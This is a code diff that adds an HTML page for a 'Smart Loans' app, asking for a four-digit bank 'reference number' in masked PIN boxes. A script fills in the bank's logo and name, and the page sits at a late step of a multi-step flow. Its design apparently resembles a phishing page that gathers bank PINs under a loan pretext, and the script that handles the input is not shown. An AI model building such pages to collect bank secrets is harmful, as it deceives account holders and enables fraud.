@@ -1,1 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
 
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank Reference Number | Smart Loans</title>
+
+<link rel="stylesheet" href="css/style.css">
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="app-header">
+
+<button class="back-btn" onclick="history.back()">
+← Back
+</button>
+
+<div>
+<div class="app-title">Smart Loans</div>
+<div class="app-subtitle">Fast • Secure • Convenient</div>
+</div>
+
+<div class="secure">
+🔒 Secure
+</div>
+
+</div>
+
+<div class="progress-bar">
+<div class="progress-fill" style="width:90%;"></div>
+</div>
+
+<div class="welcome-card">
+
+<img
+id="bankLogo"
+src=""
+alt="Bank Logo"
+style="width:80px;display:block;margin:auto;">
+
+<h2 id="bankName" style="text-align:center;margin-top:15px;">
+Reference Number
+</h2>
+
+<p class="intro">
+Enter your 4-digit reference number.
+</p>
+
+<div class="pin-container">
+
+<input class="pin-box" maxlength="1" type="password">
+<input class="pin-box" maxlength="1" type="password">
+<input class="pin-box" maxlength="1" type="password">
+<input class="pin-box" maxlength="1" type="password">
+
+</div>
+
+<br>
+
+<label>
+
+<input type="checkbox" id="showReference">
+
+Show Reference Number
+
+</label>
+
+<br><br>
+
+<button id="continueReference">
+
+Continue
+
+</button>
+
+</div>
+
+</div>
+
+<script src="js/bank-reference.js"></script>
+
+</body>
+
+</html>
